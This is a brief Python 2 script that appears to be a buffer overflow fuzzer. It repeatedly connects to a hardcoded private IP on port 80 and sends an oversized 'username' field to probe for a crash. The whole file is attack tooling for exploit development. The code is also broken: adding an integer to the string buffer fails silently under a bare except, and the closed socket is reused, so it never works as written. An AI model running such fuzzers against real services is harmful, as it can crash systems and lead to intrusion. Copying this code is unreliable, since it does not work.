#!/usr/bin/python

import socket
import time
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
buffer = "A" * 100
 
while len(buffer) <= 4000:
    try:
        print"\nSending pwnicorns and rainbows...\n"
        print "We are fuzzing with a length of %s bytes" % len(buffer)
        s.connect(('192.168.178.79', 80))
        data = s.recv(1024)
        s.send('username' + buffer + '\r\n')
        data = s.recv(1024)
        s.send('password=a\r\n')
        data = s.recv(1024)
        s.close()
        print"\nDone!"
        buffer += 200
        time.sleep(2)
    except:
        print "Could not connect to host for some reason..."
